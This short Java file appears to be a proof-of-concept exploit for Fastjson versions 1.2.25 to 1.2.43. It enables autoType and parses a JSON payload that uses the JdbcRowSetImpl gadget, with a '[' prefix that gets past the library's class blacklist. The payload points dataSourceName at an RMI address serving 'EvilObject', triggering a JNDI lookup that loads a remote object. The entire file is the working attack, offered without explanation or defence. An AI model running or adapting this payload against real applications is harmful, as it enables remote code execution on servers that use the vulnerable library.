import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

//@dependency{fastjson:1.2.25-1.2.43}
public class jdbcrowsetimpl4 {
    public static void main(String args[]) {
        String payload = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true}";
        ParserConfig config = new ParserConfig();
        config.getGlobalInstance().setAutoTypeSupport(true);
        Object res = JSON.parse(payload);

    }
}
